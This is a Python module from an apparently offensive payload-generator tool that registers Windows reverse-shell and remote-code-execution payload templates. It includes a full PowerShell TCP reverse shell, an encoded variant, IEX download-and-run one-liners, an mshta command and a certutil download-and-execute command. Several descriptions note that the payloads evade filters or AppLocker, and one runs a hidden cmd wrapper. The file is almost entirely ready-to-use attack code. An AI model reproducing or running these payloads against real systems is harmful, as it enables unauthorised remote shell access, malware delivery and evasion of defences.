"""Windows reverse shell payloads."""

from payloadforge.payloads.registry import register

# --- PowerShell ---
register(
    "powershell_tcp",
    "windows", "powershell",
    "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()",
    "PowerShell TCP reverse shell. Works on any Windows with PS 2.0+.",
    testable=False,
    test_note="PowerShell runs on Linux via pwsh but Windows socket behaviors differ.",
    tags=["tcp", "powershell"],
)

register(
    "powershell_encoded",
    "windows", "powershell",
    "powershell -e {encoded}",
    "PowerShell reverse shell with base64-encoded payload. Bypasses some naive filters.",
    testable=False,
    test_note="Uses the -EncodedCommand form; generate with: generate powershell_tcp --encode utf16le_b64",
    tags=["tcp", "powershell", "encoded"],
)

register(
    "powershell_iex_web",
    "windows", "powershell",
    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')",
    "Downloads and executes a PowerShell script from your HTTP server.",
    testable=False,
    test_note="Requires hosting shell.ps1 from the target's reachable HTTP server.",
    tags=["http", "powershell"],
)

# --- mshta ---
register(
    "mshta",
    "windows", "mshta",
    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/a'))\"\":close\")",
    "mshta HTA payload. Uses LOLBIN (living-off-the-land binary) — often bypasses AppLocker.",
    testable=False,
    test_note="mshta is Windows-only. Cannot run on Linux.",
    tags=["lolbin", "mshta"],
)

# --- certutil ---
register(
    "certutil_download",
    "windows", "cmd",
    "certutil -urlcache -split -f http://{lhost}:{lport}/payload.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
    "Uses certutil (a signed Windows binary) to download and execute a file. LOLBIN technique.",
    testable=False,
    test_note="Windows-only. Requires an HTTP server hosting payload.exe.",
    tags=["lolbin", "certutil", "download"],
)

# --- PowerShell one-liner via cmd ---
register(
    "cmd_powershell",
    "windows", "cmd",
    "cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
    "CMD wrapper around a hidden PowerShell reverse shell. Useful when only cmd.exe is available.",
    testable=False,
    test_note="Windows-only (cmd.exe).",
    tags=["tcp", "cmd", "powershell", "hidden"],
)
